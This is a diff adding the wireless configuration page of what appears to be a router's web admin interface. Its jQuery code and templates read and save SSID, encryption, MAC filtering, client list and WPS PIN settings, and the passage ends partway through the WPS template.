@@ -1,0 +1,1024 @@
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<script type="text/javascript">
+
+
+    $(document).ready(function(){
+        TempUtil.render('tabsitems-template', 'tabsitems', wirelessconfightml.tab_menu);
+        TempUtil.render('wlform1-template', 'form', wirelessconfightml.form1);
+        TempUtil.render('wlform1-template1', 'form1', wirelessconfightml.form1);
+        TempUtil.render('wlform1-template2', 'form2', wirelessconfightml.form1);
+        TempUtil.render('macInfoContainer-template', 'macInfoContainer', wirelessconfightml.macInfoContainer);
+        TempUtil.render('macControl-template', 'macControl',wirelessconfightml.macControl);
+        Page.render('#fwHead', '#fwHead_template');
+        Page.render('#fwBody', '#fwBody_template');
+		Page.render('#wpsSet', '#wpsSet_template');
+
+        var showText = wirelessconfightml.prompt;
+        var $lis = $("ul.tabs a");
+        var $boxes = $("div.tab_boxes > div");
+
+        var usrInfos = [], macInfos = [], firstRequest = true;
+
+        function createMacInfosTable(){
+
+            var length = macInfos.length;
+            var sb = new StringBuilder();
+
+            sb.append(String.format('<table class="list" cellspacing="0"><tr><th>{0}</th><th>{1}</th><th>MAC<th>{2}</th></th><th>SSID</th><th>{3}</th></tr>',
+                showText.no,DOC.device.name,DOC.net.ip,showText.rate));
+            for (var i = 0; i < length; i++) {
+                var item = macInfos[i];
+                var ipaddr = "-",name = "-";
+                for( var j = 0; j < usrInfos.length; j++)
+                {
+                    if(usrInfos[j].mac.toUpperCase() == item.mac){
+                        name = usrInfos[j].name;
+                        ipaddr = usrInfos[j].ipaddr;
+                        break;
+                    }
+                }
+                sb.append(String.format('<tr><td>{0}</td>', i + 1));
+                //  sb.append(String.format('<td><a id="edit{0}" href="javascript:;">{1}</a></td>', i, showText.edit));
+                sb.append(String.format('<td id="name{0}">{1}</td>', i,name ));
+                sb.append(String.format('<td id="mac{0}">{1}</td>', i, item.mac));
+                sb.append(String.format('<td id="ip{0}">{1}</td>', i,ipaddr ));
+                sb.append(String.format('<td id="ssid{0}">{1}</td>', i, item.ssid));
+                sb.append(String.format('<td id="ssid{0}">{1}</td>', i, item.rate));
+            }
+            sb.append('</table>');
+
+            $('#macInfos').html(sb.toString());
+
+            $('a[id^=edit]').click(function() {
+                var id = this.id.substring(4);
+                id = parseInt(id, 10);
+
+            });
+        }
+
+        function createMacListTable(macs) {
+            var sb = new StringBuilder();
+
+            sb.append(String.format('<table class="list" cellspacing="0"><tr><th>MAC</th><th>{0}</th><th>{1}</th></tr>',
+                showText.edit,showText.del));
+				
+				
+            for(var i = 0; i < macs.length; i++) {
+			    if(macs[i] !== ""){
+				   sb.append(String.format('<tr><td>{0}</td><td><a href="javascript:;" class="macEdit">{1}</a></td><td><a href="javascript:;" class="macDel">{2}</a></td></tr>',macs[i], showText.edit,showText.del));
+				}            
+            }
+
+            sb.append('</table>');
+
+            $('#macLists').html(sb.toString());
+        }
+
+
+
+
+        var $btnSave = $('#btnSave');
+        var $wifiOpen = $('#wifiOpen'), $broadcast = $('#broadcast'), $wmm = $('#wmm'), $wifiId = $('#wifiId');
+        var $policyType = $('input[name=policyType]');
+        var $btnSaveControl = $('#btnSaveControl'),$btnAdd = $('#btnAdd'),$btnClose = $('#btnClose'),
+            $btnSaveMac = $('#btnSaveMac'),$btnEditMac = $('#btnEditMac'),$box = $('#edit_box'), $mask = $('#mask');
+		var $btnSaveWps = $('#btnSaveWps');
+		
+        var editIndex = 0;
+
+        $btnAdd.click(function () {
+            $box.show();
+            $mask.show();
+			$btnSaveMac.show();
+			$btnEditMac.hide();
+            $('#edit_title').text(DOC.table.add + DOC.net.mac);
+            SysUtil.setBoxStyle1($box);
+        });
+
+        $btnClose.click(function() {
+            $box.hide();
+            $mask.hide();
+			$('#macList').val('');
+        });
+
+        $btnSaveMac.click(function () {
+            var mac = $('#macList').val().trim().toUpperCase().replace(/ /g, '').replace(/\-/g, ':');
+            if (mac == "") {
+                AlertUtil.alertMsg(CHECK.required.mac);
+                return false;
+            }
+
+            if (!CheckUtil.checkMac(mac)) {
+                AlertUtil.alertMsg(CHECK.format.mac);
+                return false;
+            }
+
+            var sb = String.format('<tr><td>{0}</td><td><a href="javascript:;" class="macEdit">{1}</a></td><td><a href="javascript:;" class="macDel">{2}</a></td></tr>',mac, showText.edit,showText.del);
+            $("'"+sb+"'").appendTo($('#macLists table'));
+            $box.hide();
+            $mask.hide();
+			$('#macList').val('');
+        });
+
+        $btnEditMac.click(function () {
+            var mac = $('#macList').val().trim().toUpperCase().replace(/ /g, '').replace(/\-/g, ':');
+            if (mac == "") {
+                AlertUtil.alertMsg(CHECK.required.mac);
+                return false;
+            }
+
+            if (!CheckUtil.checkMac(mac)) {
+                AlertUtil.alertMsg(CHECK.format.mac);
+                return false;
+            }
+
+            $('#macLists table tr').eq(editIndex).children('td').eq(0).text(mac);
+            $box.hide();
+            $mask.hide();
+            $('#macList').val('');
+
+        });
+
+        $(document).on('click','a[class="macDel"]',function(){
+            $(this).parent().parent().remove();
+        });
+
+        $(document).on('click','a[class="macEdit"]',function(){
+            $box.show();
+            $mask.show();
+			$btnSaveMac.hide();
+			$btnEditMac.show();
+            $('#edit_title').text(DOC.table.edit + DOC.net.mac);
+            SysUtil.setBoxStyle1($box);
+            $('#macList').val($(this).parent().parent().children('td').eq(0).text());
+            editIndex = $('#macLists table tr').index($(this).parent().parent());
+        });
+
+
+
+        $btnSaveControl.click(function () {
+            $(this).attr("disabled",true);
+            var  $tr = $('#macLists table tr');
+            var macArr = new Array();
+            for (var i=1;i < $tr.length;i++)
+            {
+                macArr.push($($tr[i]).children('td').eq(0).text());
+            }
+          
+            var policyType = $('input:radio[name="policyType"]:checked').val();
+
+            var json = {};
+            json.policy = policyType;
+            json.maclist = macArr;
+            json.method = JSONMethod.POST;
+            json.cmd = RequestCmd.SET_MAC_CONTROL;
+            Page.postJSON({
+                json: json,
+                success: function(data) {
+                    AlertUtil.alertMsg(PROMPT.saving.success);
+                    $lis.eq(4).click();
+                },
+                complete: function(){
+                    $('#btnSaveControl').attr("disabled",false);
+                }
+            });
+        });
+		
+		$btnSaveWps.click(function () {
+            $(this).attr("disabled",true);
+            var count = 0;
+            var $form = $('#wpsForm');
+            var json = JSON.parmsToJSON($form);
+
+            json.wpsEnble = json.wpsEnble ? '1' : '0';
+            if(json.wpsEnble ==  $("#wpsEnble").attr('old')){
+                delete json["wpsEnble"];
+                count++;
+            }
+            if(json.wpsPin ==  $("#wpsPin").attr('old')){
+                delete json["wpsPin"];
+                count++;
+            }else {
+                if(json.wpsPin.length == 0){
+                    json.wpsPin = '0';
+                }else if(json.wpsPin.length != 8){
+                    AlertUtil.alertMsg(CHECK.required.wpsLength);
+                    $(this).attr("disabled",false);
+                    return false;
+                }
+            }
+            if(count == 2){
+                AlertUtil.alertMsg(CHECK.required.noChanges);
+                $(this).attr("disabled",false);
+                return false;
+            }
+
+            json.cmd = RequestCmd.WPS_PIN_SET;
+            Page.postJSON({
+                json: json,
+                success: function(data) {
+                    console.log(data);
+                    AlertUtil.alertMsg(PROMPT.saving.success);
+                    $lis.eq(5).click();
+                },
+                complete: function(){
+                    $('#btnSaveWps').attr("disabled",false);
+                }
+            });
+
+        });
+
+        $lis.click(function() {
+            $lis.removeClass("current");
+            $(this).addClass("current");
+            var pannelIndex = $lis.index(this);
+            $boxes.eq(pannelIndex).show().siblings().hide();
+            $('#helper' + pannelIndex).show().siblings().hide();
+
+            switch (pannelIndex) {
+                case 0:
+                    Page.postJSON({
+                        json: { cmd: RequestCmd.WIFI_INFO },
+                        success: function(datas) {
+                            console.log(datas);
+                            var data = datas.data;
+                            if(data.status == 0){
+                                $wifiOpen.prop('checked', true);
+                                $lis.eq(1).show();
+                                $lis.eq(2).show();
+                            }else {
+                                $wifiOpen.prop('checked', false);
+                                $lis.eq(1).hide();
+                                $lis.eq(2).hide();
+
+                            }
+                            $wifiOpen.attr('old',data.status);
+                            $wifiId.val(data.wifi_id);
+
+                            if(data.hidden_ssid == 0){
+                                $broadcast.prop('checked', true);
+                            } else {
+                                $broadcast.prop('checked', false);
+                            }
+                            $broadcast.attr('old',data.hidden_ssid || 1);
+
+                            if(data.wmm == 1){
+                                $wmm.prop('checked', true);
+                            } else {
+                                $wmm.prop('checked', false);
+                            }
+                            $wmm.attr('old',data.wmm ||  0);
+
+                            Page.setFormFieldValue2("txPower", data.txpower);
+                            Page.setFormFieldValue2("maxStation", data.maxassoc);
+                            Page.setFormFieldValue2("channel", data.channel);
+                            Page.setFormFieldValue2("ssid", data.ssid);
+                            Page.setFormFieldValue2("wifiWorkMode", data.mode);
+                            Page.setFormFieldValue2("ht", data.ht);
+                            var encryp = data.encryption.split("+")[0];
+                            var encrypType = '"'+data.encryption.substring(encryp.length +1) +'"';
+                            Page.setFormFieldValue2("authenticationType", encryp);
+                            $("#encryptAlgorithm >input[value=" + encrypType +"]").attr("checked",true);
+                            $('#encryptAlgorithm').attr('old',data.encryption.substring(encryp.length +1));
+                            Page.setFormFieldValue2("key", data.key);
+
+                        }
+                    });
+                    Page.getHelperPage('html/config/wirelessConfig.html');
+                    $('.helper_box').show();
+                    break;
+                case 1:
+                case 2:
+                    Page.postJSON({
+                        json: { cmd: RequestCmd.SSIDLIST_INFO,wifiId: $wifiId.val() },
+                        success: function(datas) {
+                            console.log(datas);
+                            var data = datas.data;
+                            for(var i = 1; i <= data.length; i++) {
+                                if(data[i].status == 0){
+                                    $('#wifiOpen' + i).prop('checked', true);
+                                }else {
+                                    $('#wifiOpen' + i).prop('checked', false);
+                                }
+                                $('#wifiOpen' + i).attr('old',data[i].status);
+
+                                if (data[i].hidden_ssid == 0) {
+                                    $('#broadcast' + i).prop('checked', true);
+                                } else {
+                                    $('#broadcast' + i).prop('checked', false);
+                                }
+                                $('#broadcast' + i).attr('old', data[i].hidden_ssid || 1);
+
+                                if (data[i].wmm == 1) {
+                                    $('#wmm' + i).prop('checked', true);
+                                } else {
+                                    $('#wmm' + i).prop('checked', false);
+                                }
+                                $('#wmm' + i).attr('old', data[i].wmm || 0);
+
+                                $('#secondaryId' + i).val(data[i].secondary_id);
+                                Page.setFormFieldValue2("ssid" +i, data[i].ssid);
+                                Page.setFormFieldValue2("authenticationType" +i, data[i].encryption);
+                                $("#encryptAlgorithm" + i+">input[value=" +data[i].encry_algorithms +"]").attr("checked",true);
+                                $('#encryptAlgorithm'+i).attr('old',data[i].encry_algorithms);
+                                Page.setFormFieldValue2("key" +i, data[i].password);
+                            }
+
+                        }
+                    });
+                    $('.helper_box').show();
+                    break;
+                case 3:
+                    if (firstRequest) {
+                        Page.postJSON({
+                            json: {
+                                cmd: RequestCmd.WIFI_CONTROL_INFO,
+                                method: JSONMethod.GET
+                            },
+                            success: function(data) {
+                                usrInfos = data.userlist;
+                                macInfos = data.wifilist;
+                                console.log(macInfos);
+                                createMacInfosTable();
+                                firstRequest = false;
+                            }
+                        });
+                    }
+                    $('.helper_box').hide();
+                    break;
+
+                case 4:
+                    Page.postJSON({
+                        json: {
+                            cmd: RequestCmd.MAC_ACCESS_CONTROL,
+                            method: JSONMethod.GET
+                        },
+                        success: function(datas) {
+                            console.log(datas);
+                            var data = datas.maclist;
+                            InputUtil.setRadiosSelectedValue($policyType, data.policy);
+                            if(data.macs == undefined){
+                                createMacListTable('');
+                            }else {
+                                createMacListTable(data.macs);
+                            }
+                        }
+                    });
+                    $('.helper_box').hide();
+                    break;
+				case 5:
+					Page.postJSON({
+                        json: {
+                            cmd: RequestCmd.WPS_PIN_GET,
+							method: JSONMethod.GET
+                        },
+                        success: function(datas) {
+                            console.log(datas);
+							 var data = datas.data;
+                            if(data.status == 0){
+                                $('#wpsEnble').prop('checked', false);
+                            }else {
+                                $('#wpsEnble').prop('checked', true);
+                            }
+                            $('#wpsEnble').attr('old',data.status);
+                            Page.setFormFieldValue2("wpsPin", data.pin);
+                        }
+                    });
+                    $('.helper_box').hide();
+                    break;
+            }
+        });
+
+        $lis.eq(0).click();
+        var maxAllowedStation =  Page.maxAllowedStation ? Page.maxAllowedStation : 32;
+
+        var wireless_rules = {
+            ssid: {required: true, minlength: 4,ssidRules:true},
+            maxStation: {required: true, range: [1, parseInt(maxAllowedStation, 10)]}
+        };
+
+        var wireless_messages = {
+            ssid: {required: showText.ssidCheckMsg1, minlength: showText.ssidCheckMsg2,ssidRules:showText.ssidCheckMsg3},
+            maxStation: {required: showText.maxStationCheckMsg1, range: showText.maxStationCheckMsg2 + maxAllowedStation}
+        };
+
+        $btnSave.click(function() {
+
+            $(this).attr("disabled",true);
+            var count = 0;
+            var $form = $('#form');
+            if(!CheckUtil.checkForm($form, wireless_rules, wireless_messages)){
+                $(this).attr("disabled",false);
+                return false;
+            }
+
+            var json = JSON.parmsToJSON($form);
+
+            if(json.key == $('#key').attr('old')){
+                delete json["key"];
+                count++;
+            }else {
+                if (!CheckUtil.checkPwd(json.key)) {
+                    AlertUtil.alertMsg(showText.keyCkeckMsg);
+                    $(this).attr("disabled", false);
+                    return false;
+                }
+            }
+
+            json.wifiOpen = json.wifiOpen ? '0' : '1';
+            json.broadcast = json.broadcast ? '0' : '1';
+            json.wmm = json.wmm ? '1' : '0';
+
+            if(json.wifiOpen ==  $wifiOpen.attr('old')){
+                delete json["wifiOpen"];
+                count++;
+            }
+            if(json.broadcast ==  $broadcast.attr('old')){
+                delete json["broadcast"];
+                count++;
+            }
+            if(json.wmm ==  $wmm.attr('old')){
+                delete json["wmm"];
+                count++;
+            }
+            if(json.ssid ==  $("#ssid").attr('old')){
+                delete json["ssid"];
+                count++;
+            }
+            if(json.txPower ==  $("#txPower").attr('old')){
+                delete json["txPower"];
+                count++;
+            }
+            if(json.maxStation ==  $("#maxStation").attr('old')){
+                delete json["maxStation"];
+                count++;
+            }
+            if(json.channel ==  $("#channel").attr('old')){
+                delete json["channel"];
+                count++;
+            }
+            if(json.wifiWorkMode ==  $("#wifiWorkMode").attr('old')){
+                delete json["wifiWorkMode"];
+                count++;
+            }
+            if(json.ht ==  $("#ht").attr('old')){
+                delete json["ht"];
+                count++;
+            }
+            if(json.authenticationType == $("#authenticationType").attr('old')){
+                delete json["authenticationType"];
+                count++;
+            }
+
+            if(json.encryptAlgorithm == $('#encryptAlgorithm').attr('old'))
+            {
+                delete json["encryptAlgorithm"];
+                count++;
+            }
+            if(count == 12){
+                AlertUtil.alertMsg(CHECK.required.noChanges);
+                $(this).attr("disabled",false);
+                return false;
+            }
+
+            json.cmd = RequestCmd.WIRELESS_CONFIG;
+            console.log(json);
+            Page.postJSON({
+                json: json,
+                success: function(data) {
+                    console.log(data);
+                    AlertUtil.alertMsg(PROMPT.saving.success);
+                    $lis.eq(0).click();
+                },
+                complete: function(){
+                    $('#btnSave').attr("disabled",false);
+                }
+            });
+
+        });
+
+        var $btn2Save = $('input[id^=btn2Save]');
+
+        $btn2Save.click(function() {
+            var id = this.id.substring(8);
+            $(this).attr("disabled",true);
+            var count = 0;
+            var $form = $('#form'+id);
+            if(!CheckUtil.checkForm($form, wireless_rules, wireless_messages)){
+                $(this).attr("disabled",false);
+                return false;
+            }
+            var json = JSON.parmsToJSON($form);
+
+            if(json.key == $('#key' +id).attr('old')){
+                delete json["key"];
+                count++;
+            }else {
+                if (!CheckUtil.checkPwd(json.key)) {
+                    AlertUtil.alertMsg(showText.keyCkeckMsg);
+                    $(this).attr("disabled", false);
+                    return false;
+                }
+            }
+
+            json.wifiOpen = json.wifiOpen ? '0' : '1';
+            json.broadcast = json.broadcast ? '0' : '1';
+            json.wmm = json.wmm ? '1' : '0';
+
+            if(json.wifiOpen ==  $("#wifiOpen" +id).attr('old')){
+                delete json["wifiOpen"];
+                count++;
+            }
+            if(json.broadcast == $("#broadcast" +id).attr('old')){
+                delete json["broadcast"];
+                count++;
+            }
+            if(json.wmm ==   $('#wmm' + id).attr('old')){
+                delete json["wmm"];
+                count++;
+            }
+            if(json.ssid ==  $('#ssid' + id).attr('old')){
+                delete json["ssid"];
+                count++;
+            }
+            if(json.wifiWorkMode ==  $('#wifiWorkMode' + id).attr('old')){
+                delete json["wifiWorkMode"];
+                count++;
+            }
+            if(json.authenticationType == $("#authenticationType" +id).attr('old')){
+                delete json["authenticationType"];
+                count++;
+            }
+
+            if(json.encryptAlgorithm == $('#encryptAlgorithm' +id).attr('old'))
+            {
+                delete json["encryptAlgorithm"];
+                count++;
+            }
+            if(count == 8){
+                AlertUtil.alertMsg(CHECK.required.noChanges);
+                $(this).attr("disabled",false);
+                return false;
+            }
+
+            json.cmd = RequestCmd.SSIDLIST_CONFIG;;
+            json.wifiId = $wifiId.val();
+            console.log(json);
+            Page.postJSON({
+                json: json,
+                success: function(data) {
+                    console.log(data);
+                    AlertUtil.alertMsg(PROMPT.saving.success);
+                    $lis.eq(id).click();
+                },
+                complete: function(){
+                    $('#btn2Save'+id).attr("disabled",false);
+                }
+            });
+
+        });
+
+    });
+
+    function showPsw(id){
+        var demoInput = document.getElementById("key"+id);
+        if (demoInput.type == "password") {
+            demoInput.type = "text";
+            $('#passwordImg'+id).attr('src','/images/open.png');
+        }else {
+            demoInput.type = "password";
+            $('#passwordImg'+id).attr('src','/images/close.png');
+        }
+    }
+
+
+</script>
+<div class="detail_box">
+    <div class="tab_menu">
+        <ul class="tabs" id="tabsitems">
+            <script type="text/template" id="tabsitems-template">
+                <li id="walnInfo" ><a href="javascript:;"><%- item1 %></a></li>
+                <li id="walnInfo1" ><a href="javascript:;"><%- item3 %></a></li>
+                <li id="walnInfo2" ><a href="javascript:;"><%- item4 %></a></li>
+                <li ><a href="javascript:;"><%- connectedList %></a></li>
+                <li ><a href="javascript:;"><%- macControl %></a></li>
+				<li ><a href="javascript:;"><%- wps %></a></li>
+            </script>
+        </ul>
+    </div>
+    <div class="tab_menu_bottom"></div>
+    <div>
+        <div class="tab_boxes" >
+            <div  class="main_box">
+                <form id="form">
+                    <script type="text/template" id="wlform1-template">
+                        <table class="detail" cellspacing="0">
+                            <tr style = "display:none">
+                                <td> <input type="text" id="wifiId" name="wifiId" /></td>
+                            </tr>
+                            <tr>
+                                <th><%- wifiFunction %></th>
+                                <td>
+                                    <input type="checkbox" id="wifiOpen" name="wifiOpen" /><%- open %>
+                                </td>
+                            </tr>
+                            <tr>
+                                <th><%- ssidBd %></th>
+                                <td>
+                                    <input type="checkbox" id="broadcast" name="broadcast" /><%- open %>
+                                </td>
+                            </tr>
+                            <tr class="wifi_wmm">
+                                <th><%- wmm %></th>
+                                <td>
+                                    <input type="checkbox" id="wmm" name="wmm" /><%- open %>
+                                </td>
+                            </tr>
+
+                            <tr>
+                                <th><%- ssid %></th>
+                                <td><input type="text" id="ssid" name="ssid" maxlength="32" class="normal" autocomplete="off" /></td>
+                            </tr>
+
+                            <tr>
+                                <th><%- txPower %></th>
+                                <td>
+                                    <input type="text" id="txPower" name="txPower" maxlength="4" class="txt2" />&nbsp;dBm<span class="cmt">(<%- txPowerCmt %>)</span>
+                                </td>
+                            </tr>
+
+                            <tr>
+                                <th><%- maxStation %></th>
+                                <td>
+                                    <input type="text" id="maxStation" name="maxStation" maxlength="4" class="txt2" /><span class="cmt">(<%= maxStationCmt %>)</span>
+                                </td>
+                            </tr>
+
+                            <tr>
+                                <!--信道-->
+                                <th><%- channel %></th>
+                                <td><select id="channel" name="channel">
+                                    <option value="auto"><%- auto %></option>
+                                    <option value="1" class="ch_opt">1</option>
+                                    <option value="2" class="ch_opt">2</option>
+                                    <option value="3" class="ch_opt">3</option>
+                                    <option value="4" class="ch_opt">4</option>
+                                    <option value="5">5</option>
+                                    <option value="6" selected="selected">6</option>
+                                    <option value="7">7</option>
+                                    <option value="8">8</option>
+                                    <option value="9">9</option>
+                                    <option value="10">10</option>
+                                    <option value="11">11</option>
+                                    <option value="12" class="ch_opt2">12</option>
+                                    <option value="13" class="ch_opt2">13</option>
+                                </select></td>
+                            </tr>
+
+                            <!--<tr>-->
+                            <!--<th><%- wifiMode %></th>-->
+                            <!--<td><select id="wifiWorkMode2" name="wifiWorkMode">-->
+                            <!--<option value="m11ng"  selected="selected"><%- m11ng %></option>-->
+                            <!--<option value="m11b"><%- m11b %></option>-->
+                            <!--<option value="m11g"><%- m11g %></option>-->
+                            <!--<option value="m11bg"><%- m11bg %></option>-->
+                            <!--<option value="m11n"><%- m11n %></option>-->
+                            <!--<option value="m11nSingleFixed" class="opt_wifi_mode"><%- m11nSingleFixed %></option>-->
+                            <!--<option value="m11nSingleFixedMax" class="opt_wifi_mode"><%- m11nSingleFixedMax %></option>-->
+                            <!--<option value="m11nDoubleFixed" class="opt_wifi_mode"><%- m11nDoubleFixed %></option>-->
+                            <!--<option value="m11nDoubleFixedMax" class="opt_wifi_mode"><%- m11nDoubleFixedMax %></option>-->
+                            <!--</select></td>-->
+                            <!--</tr>-->
+
+                            <tr>
+                                <th><%- wifiMode %></th>
+                                <td><select id="wifiWorkMode" name="wifiWorkMode">
+                                    <option value="0"  selected="selected">legacy 11b/g mixed</option>
+                                    <option value="1">legacy 11b only</option>
+                                    <option value="2">legacy 11a only</option>
+                                    <option value="3">legacy 11a/b/g mixed</option>
+                                    <option value="4">legacy 11g only</option>
+                                    <option value="5">11abgn mixed</option>
+                                    <option value="6">11n only in 2.4g band</option>
+                                    <option value="7">11gn mixed</option>
+                                    <option value="8">11an mixed</option>
+                                    <option value="9">11bgn mixed</option>
+                                    <option value="10">11AGN mixed</option>
+                                </select></td>
+                            </tr>
+
+                            <tr id="bandWidthTr">
+                                <th><%- bandWidth %></th>
+                                <td>
+                                    <select name="ht" id="ht">
+                                        <option value="20"><%- bandWidth20 %></option>
+                                        <option value="20+40"><%- bandWidth60 %></option>
+                                    </select>
+                                </td>
+                            </tr>
+
+                            <!--<tr>-->
+                            <!--<th><%- secure %></th>-->
+                            <!--<td>-->
+                            <!--&lt;!&ndash;<select name="security_config" id="security_config2">&ndash;&gt;-->
+                            <!--&lt;!&ndash;<option value="OPEN"><%- none %></option>&ndash;&gt;-->
+                            <!--&lt;!&ndash;<option value="WPA2PSK">WPA2PSK[AES]<%- recommend %></option>&ndash;&gt;-->
+                            <!--&lt;!&ndash;</select>&ndash;&gt;-->
+                            <!--<select name="security_config" id="security_config">-->
+                            <!--<option value="none"><%- none %></option>-->
+                            <!--<option value="psk2">WPA2PSK[AES]<%- recommend %></option>-->
+                            <!--</select>-->
+                            <!--</td>-->
+                            <!--</tr>-->
+                            <tr>
+                                <th><%- authenticationType %></th>
+                                <td>
+                                    <select name="authenticationType" id="authenticationType">
+                                        <option value="none"><%- openSys %></option>
+                                        <option value="psk"><%- wpa_psk %></option>
+                                        <option value="psk2"><%- wpa2_psk %></option>
+                                        <option value="mixed"><%- wpa_wpa2_psk %></option>
+                                    </select>
+                                </td>
+                            </tr>
+                            <tr>
+                                <th><%- encryptAlgorithmTh %></th>
+                                <td>
+                                    <label id="encryptAlgorithm">
+                                        <input type="radio" value="none" name="encryptAlgorithm"/>
+                                        &nbsp;<span><%- auto %></span>
+                                        <input type="radio" value="tkip" name="encryptAlgorithm"/>
+                                        &nbsp;<span><%- tkip %></span>
+                                        <input type="radio" value="ccmp" name="encryptAlgorithm"/>
+                                        &nbsp;<span><%- aes %></span>
+                                        <input type="radio" value="ccmp+tkip" name="encryptAlgorithm"/>
+                                        &nbsp;<span><%- tkip_aes %></span>
+                                    </label>
+                                </td>
+                            </tr>
+                            <tr>
+                                <th><%- key %></th>
+                                <td>
+                                    <input type="password" name="key" maxlength="63" id="key"/>
+                                    <img id="passwordImg" class="passwordImg" onclick="showPsw('')" src="/images/close.png">
+                                </td>
+                            </tr>
+
+
+                            <tr>
+                                <th>&nbsp;</th>
+                                <td><input type="button" id="btnSave" value="<%- btnSave %>" /></td>
+                            </tr>
+                        </table>
+                    </script>
+                </form>
+            </div>
+
+            <div  class="main_box">
+                <form id="form1">
+                    <script type="text/template" id="wlform1-template1">
+                        <table class="detail" cellspacing="0">
+                            <tr style = "display:none">
+                                <td> <input type="text" id="secondaryId1" name="secondaryId" /></td>
+                            </tr>
+                            <tr>
+                                <th><%- wifiFunction %></th>
+                                <td>
+                                    <input type="checkbox" id="wifiOpen1" name="wifiOpen" /><%- open %>
+                                </td>
+                            </tr>
+                            <tr>
+                                <th><%- ssidBd %></th>
+                                <td>
+                                    <input type="checkbox" id="broadcast1" name="broadcast" /><%- open %>
+                                </td>
+                            </tr>
+                            <tr class="wifi_wmm">
+                                <th><%- wmm %></th>
+                                <td>
+                                    <input type="checkbox" id="wmm1" name="wmm" /><%- open %>
+                                </td>
+                            </tr>
+
+                            <tr>
+                                <th><%- ssid %></th>
+                                <td><input type="text" id="ssid1" name="ssid" maxlength="32" class="normal" autocomplete="off" /></td>
+                            </tr>
+
+
+                            <tr>
+                                <th><%- authenticationType %></th>
+                                <td>
+                                    <select name="authenticationType" id="authenticationType1">
+                                        <option value="none"><%- openSys %></option>
+                                        <option value="psk"><%- wpa_psk %></option>
+                                        <option value="psk2"><%- wpa2_psk %></option>
+                                        <option value="mixed"><%- wpa_wpa2_psk %></option>
+                                    </select>
+                                </td>
+                            </tr>
+                            <tr>
+                                <th><%- encryptAlgorithmTh %></th>
+                                <td>
+                                    <label id="encryptAlgorithm1">
+                                        <input type="radio" value="none" name="encryptAlgorithm"/>
+                                        &nbsp;<span><%- auto %></span>
+                                        <input type="radio" value="tkip" name="encryptAlgorithm"/>
+                                        &nbsp;<span><%- tkip %></span>
+                                        <input type="radio" value="ccmp" name="encryptAlgorithm"/>
+                                        &nbsp;<span><%- aes %></span>
+                                        <input type="radio" value="ccmp+tkip" name="encryptAlgorithm"/>
+                                        &nbsp;<span><%- tkip_aes %></span>
+                                    </label>
+                                </td>
+                            </tr>
+                            <tr>
+                                <th><%- key %></th>
+                                <td>
+                                    <input type="password" name="key" maxlength="63" id="key1"/>
+                                    <img id="passwordImg1" class="passwordImg" onclick="showPsw(1)" src="/images/close.png">
+                                </td>
+                            </tr>
+
+
+                            <tr>
+                                <th>&nbsp;</th>
+                                <td><input type="button" id="btn2Save1" value="<%- btnSave %>" /></td>
+                            </tr>
+                        </table>
+                    </script>
+                </form>
+            </div>
+
+            <div  class="main_box">
+                <form id="form2">
+                    <script type="text/template" id="wlform1-template2">
+                        <table class="detail" cellspacing="0">
+                            <tr style = "display:none">
+                                <td> <input type="text" id="secondaryId2" name="secondaryId" /></td>
+                            </tr>
+                            <tr>
+                                <th><%- wifiFunction %></th>
+                                <td>
+                                    <input type="checkbox" id="wifiOpen2" name="wifiOpen" /><%- open %>
+                                </td>
+                            </tr>
+                            <tr>
+                                <th><%- ssidBd %></th>
+                                <td>
+                                    <input type="checkbox" id="broadcast2" name="broadcast" /><%- open %>
+                                </td>
+                            </tr>
+                            <tr class="wifi_wmm">
+                                <th><%- wmm %></th>
+                                <td>
+                                    <input type="checkbox" id="wmm2" name="wmm" /><%- open %>
+                                </td>
+                            </tr>
+
+                            <tr>
+                                <th><%- ssid %></th>
+                                <td><input type="text" id="ssid2" name="ssid" maxlength="32" class="normal" autocomplete="off" /></td>
+                            </tr>
+
+                            <tr>
+                                <th><%- authenticationType %></th>
+                                <td>
+                                    <select name="authenticationType" id="authenticationType2">
+                                        <option value="none"><%- openSys %></option>
+                                        <option value="psk"><%- wpa_psk %></option>
+                                        <option value="psk2"><%- wpa2_psk %></option>
+                                        <option value="mixed"><%- wpa_wpa2_psk %></option>
+                                    </select>
+                                </td>
+                            </tr>
+                            <tr>
+                                <th><%- encryptAlgorithmTh %></th>
+                                <td>
+                                    <label id="encryptAlgorithm2">
+                                        <input type="radio" value="none" name="encryptAlgorithm"/>
+                                        &nbsp;<span><%- auto %></span>
+                                        <input type="radio" value="tkip" name="encryptAlgorithm"/>
+                                        &nbsp;<span><%- tkip %></span>
+                                        <input type="radio" value="ccmp" name="encryptAlgorithm"/>
+                                        &nbsp;<span><%- aes %></span>
+                                        <input type="radio" value="ccmp+tkip" name="encryptAlgorithm"/>
+                                        &nbsp;<span><%- tkip_aes %></span>
+                                    </label>
+                                </td>
+                            </tr>
+                            <tr>
+                                <th><%- key %></th>
+                                <td>
+                                    <input type="password" name="key" maxlength="63" id="key2"/>
+                                    <img id="passwordImg2" class="passwordImg" onclick="showPsw(2)" src="/images/close.png">
+                                </td>
+                            </tr>
+
+
+                            <tr>
+                                <th>&nbsp;</th>
+                                <td><input type="button" id="btn2Save2" value="<%- btnSave %>" /></td>
+                            </tr>
+                        </table>
+                    </script>
+                </form>
+            </div>
+
+            <div id="macInfoContainer">
+                <script type="text/template" id="macInfoContainer-template">
+                    <div id="macInfos"><%- macInfos %></div>
+                </script>
+            </div>
+
+            <div id="macControl">
+                <script type="text/template" id="macControl-template">
+                    <table class="detail" cellspacing="0">
+                        <tr>
+                            <th><%- policyTh %></th>
+                            <td>
+                                <label id="policyType">
+                                    <input type="radio" name="policyType" value="0" /><%= unPolicy %>&nbsp;&nbsp;
+                                    <input type="radio" name="policyType" value="1" /><%= allowPolicy %>&nbsp;&nbsp;
+                                    <input type="radio" name="policyType" value="2" /><%= denyPolicy %>&nbsp;&nbsp;
+                                </label>
+                            </td>
+                        </tr>
+                        <tr>
+                            <th><%- macList %></th>
+                            <td>
+                                <input id="btnAdd" type="button" value="<%-addMac %>" />
+                                <div id="macLists"></div>
+                            </td>
+                        </tr>
+                        <tr>
+                            <th>&nbsp;</th>
+                            <td><input type="button" id="btnSaveControl" value="<%- btnSave %>" /></td>
+                        </tr>
+                    </table>
+                </script>
+            </div>
+
+			<div  id="wpsSet">
+                <script type="text/template" id="wpsSet_template">
+                    <form id="wpsForm" >
+                        <table class="detail" cellspacing="0">
+                            <tr>
+                                <th><%- lbl.wpsEnble %><%- colon %></th>
+                                <td>
+                                    <input type="checkbox" id="wpsEnble" name="wpsEnble" /><%- status.enable %>
